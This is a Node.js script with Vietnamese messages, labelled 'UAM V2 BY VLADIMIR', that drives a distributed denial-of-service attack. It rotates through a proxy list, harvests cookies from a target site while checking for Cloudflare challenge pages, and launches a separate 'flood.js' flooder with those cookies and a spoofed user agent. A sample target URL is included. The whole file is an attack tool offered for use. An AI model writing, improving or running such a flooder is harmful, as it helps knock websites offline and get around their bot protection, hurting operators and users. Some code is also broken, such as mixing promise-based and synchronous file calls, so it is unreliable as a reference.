const https = require('https');
const http = require('http');
const fs = require('fs').promises;
const chalk = require('chalk');
const async = require('async');
const { exec } = require('child_process');
const url = require('url');

// Xử lý lỗi
const errorHandler = error => console.log(chalk.red(`[LỖI] ${error.message}`));
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

// Định nghĩa màu sắc
const colors = {
    COLOR_RED: "\x1b[31m",
    COLOR_GREEN: "\x1b[32m",
    COLOR_YELLOW: "\x1b[33m",
    COLOR_RESET: "\x1b[0m"
};

// Hàm in thông báo màu
function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
}

// User-Agent ngẫu nhiên
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
];
const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

// Đọc proxy từ file (chỉ ip:port)
const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).map(proxy => {
            const regex = /^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)$/;
            const match = proxy.match(regex);
            if (!match) return null;
            return {
                host: match[1],
                port: match[2],
                raw: match[0]
            };
        }).filter(proxy => proxy !== null);
        return proxies;
    } catch (error) {
        console.error(chalk.red(`[LỖI] Lỗi khi đọc file proxy: ${error.message}`));
        return [];
    }
};

// Hàm lấy cookie siêu nhanh
async function getCookies(targetURL, browserProxy, attempt = 1, maxRetries = 2) {
    return new Promise((resolve) => {
        try {
            const parsedUrl = url.parse(targetURL);
            const protocol = parsedUrl.protocol === 'https:' ? https : http;

            // Tùy chọn yêu cầu tối ưu
            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.path || '/',
                method: 'GET',
                headers: {
                    'User-Agent': userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Upgrade-Insecure-Requests': '1'
                },
                agent: new protocol.Agent({
                    host: browserProxy.host,
                    port: browserProxy.port,
                    keepAlive: true,
                    maxSockets: 100,
                    timeout: 5000 // Timeout 5 giây
                }),
                rejectUnauthorized: false // Bỏ qua lỗi SSL
            };

            const req = protocol.request(options, (res) => {
                let data = '';

                res.on('data', (chunk) => {
                    data += chunk;
                });

                res.on('end', async () => {
                    // Kiểm tra Cloudflare
                    if (data.includes("Attention Required! | Cloudflare") ||
                        data.includes("challenge-platform") ||
                        data.includes("Just a moment...")) {
                        colored(colors.COLOR_RED, `[THÔNG BÁO] Bị chặn bởi Cloudflare với proxy: ${browserProxy.raw}`);
                        resolve(null);
                        return;
                    }

                    // Lấy cookie từ header
                    const cookies = res.headers['set-cookie'] || [];
                    if (!cookies.length) {
                        colored(colors.COLOR_RED, `[LỖI] Không có cookie với proxy: ${browserProxy.raw}`);
                        resolve(null);
                        return;
                    }

                    // Chuyển đổi cookie thành chuỗi
                    const cookieString = cookies.map(cookie => {
                        const [nameValue] = cookie.split(';').map(str => str.trim());
                        return nameValue;
                    }).join('; ');

                    // Lưu cookie vào file
                    await fs.writeFile('cookies.json', JSON.stringify(cookies, null, 2));

                    resolve({
                        title: data.match(/<title>(.*?)<\/title>/i)?.[1] || 'Không có tiêu đề',
                        browserProxy: browserProxy.raw,
                        cookies: cookieString,
                        userAgent
                    });
                });
            });

            req.on('error', (error) => {
                if (attempt < maxRetries) {
                    colored(colors.COLOR_YELLOW, `[THÔNG BÁO] Thử lại lần ${attempt + 1} với proxy: ${browserProxy.raw}`);
                    resolve(getCookies(targetURL, browserProxy, attempt + 1, maxRetries));
                } else {
                    colored(colors.COLOR_RED, `[LỖI] Không thể lấy cookie với proxy: ${browserProxy.raw}. Lỗi: ${error.message}`);
                    resolve(null);
                }
            });

            req.setTimeout(5000, () => {
                req.destroy();
                colored(colors.COLOR_RED, `[LỖI] Timeout với proxy: ${browserProxy.raw}`);
                resolve(null);
            });

            req.end();
        } catch (error) {
            colored(colors.COLOR_RED, `[LỖI] Lỗi khi lấy cookie: ${error.message}`);
            resolve(null);
        }
    });
}

// Hàm chạy luồng
let cookieCount = 0;
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === 1) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
        return;
    }

    try {
        const response = await getCookies(targetURL, browserProxy);
        if (response) {
            if (response.title.includes("Attention Required! | Cloudflare")) {
                colored(colors.COLOR_RED, `[THÔNG BÁO] Bị chặn bởi Cloudflare. Thoát.`);
                return;
            }
            if (!response.cookies) {
                colored(colors.COLOR_RED, `[LỖI] Không có cookie với proxy: ${browserProxy.raw}`);
                return;
            }
            cookieCount++;
            const cookies = `[THÔNG BÁO] Tổng số lần giải: ${cookieCount} | Tiêu đề: ${response.title} | Proxy: ${browserProxy.raw} | Cookies: ${response.cookies}`;
            colored(colors.COLOR_GREEN, cookies);

            // Gọi flood.js
            try {
                exec(`node flood.js ${targetURL} ${duration} ${thread} ${browserProxy.raw} ${rates} "${response.cookies}" "${response.userAgent}"`, (err) => {
                    if (err) {
                        colored(colors.COLOR_RED, `[THÔNG BÁO] Lỗi khi chạy flood.js: ${err.message}`);
                    }
                });
            } catch (error) {
                colored(colors.COLOR_RED, `[THÔNG BÁO] Lỗi khi chạy flood.js: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
}

// Cấu hình tham số dòng lệnh
if (process.argv.length < 8) {
    console.clear();
    console.log(`
  ${chalk.cyanBright('UAM V2 BY VLADIMIR')} | Cập nhật: 7 Tháng 10, 2025
    
    ${chalk.blueBright('Cách sử dụng:')}
      ${chalk.redBright(`node ${process.argv[1]} <mục tiêu> <thời gian> <luồng trình duyệt> <luồng flood> <yêu cầu> <proxy>`)}
      ${chalk.yellowBright(`Ví dụ: node ${process.argv[1]} https://captcha.nminhniee.sbs 400 5 2 30 proxy.txt`)}
    `);
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];

if (!/^https?:\/\//i.test(targetURL)) {
    console.error(chalk.red('[LỖI] URL phải bắt đầu bằng http:// hoặc https://'));
    process.exit(1);
}

// Khởi tạo hàng đợi
const queue = async.queue(function(task, done) {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(function() {
    colored(colors.COLOR_RED, "[THÔNG BÁO] Đã xử lý tất cả proxy");
    process.exit(0);
});

// Hàm chính
async function main() {
    const proxies = readProxiesFromFile(proxyFile);
    if (proxies.length === 0) {
        colored(colors.COLOR_RED, "[LỖI] Không tìm thấy proxy trong file. Thoát.");
        process.exit(1);
    }

    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({ browserProxy });
    }

    setTimeout(() => {
        colored(colors.COLOR_YELLOW, "[THÔNG BÁO] Hết thời gian! Đang dọn dẹp...");
        queue.kill();
        exec('pkill -f flood.js', (err) => {
            if (err && err.code !== 1) {
                colored(colors.COLOR_RED, `[LỖI] Lỗi khi dừng flood.js: ${err.message}`);
            } else {
                colored(colors.COLOR_GREEN, "[THÔNG BÁO] Đã dừng các tiến trình flood.js thành công");
            }
        });
        setTimeout(() => {
            colored(colors.COLOR_GREEN, "[THÔNG BÁO] Thoát");
            process.exit(0);
        }, 5000);
    }, duration * 1000);
}

// Chạy chương trình
console.clear();
colored(colors.COLOR_GREEN, "[THÔNG BÁO] Đang chạy...");
colored(colors.COLOR_GREEN, `[THÔNG BÁO] Mục tiêu: ${targetURL}`);
colored(colors.COLOR_GREEN, `[THÔNG BÁO] Thời gian: ${duration} giây`);
colored(colors.COLOR_GREEN, `[THÔNG BÁO] Luồng trình duyệt: ${threads}`);
colored(colors.COLOR_GREEN, `[THÔNG BÁO] Luồng Flooder: ${thread}`);
colored(colors.COLOR_GREEN, `[THÔNG BÁO] Tỷ lệ Flooder: ${rates}`);
colored(colors.COLOR_GREEN, `[THÔNG BÁO] Proxy: ${proxies.length} | Tên file: ${proxyFile}`);
main().catch(err => {
    colored(colors.COLOR_RED, `[LỖI] Lỗi hàm chính: ${err.message}`);
    process.exit(1);
});